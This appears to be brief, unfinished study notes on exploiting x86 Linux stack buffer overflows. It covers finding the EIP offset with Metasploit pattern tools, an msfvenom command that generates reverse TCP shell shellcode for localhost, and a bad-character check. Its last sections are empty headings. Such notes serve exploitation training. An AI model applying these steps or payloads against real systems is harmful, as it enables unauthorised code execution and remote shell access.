# buffer overflow Linux x86

## Take control EIP

### Determine the offset

- Get rough estimate offset
```shell
$(python -c 'print("A"*1000)')
```

- Create pattern
```shell
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
```

- Calculate offset
```shell
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
```

- Verify offset
```shell
$(python -c "print 'A' * 1000 + 'B' * 4")
```

## Determine length shellcode

- Generate shellcode using `msfvenom`

```shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
```

## Identification bad characters

```shell
CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a"
```
```shell
echo $CHARS | sed 's/\\x/ /g' | wc -w
```

## Generating shellcode

## Identification return address

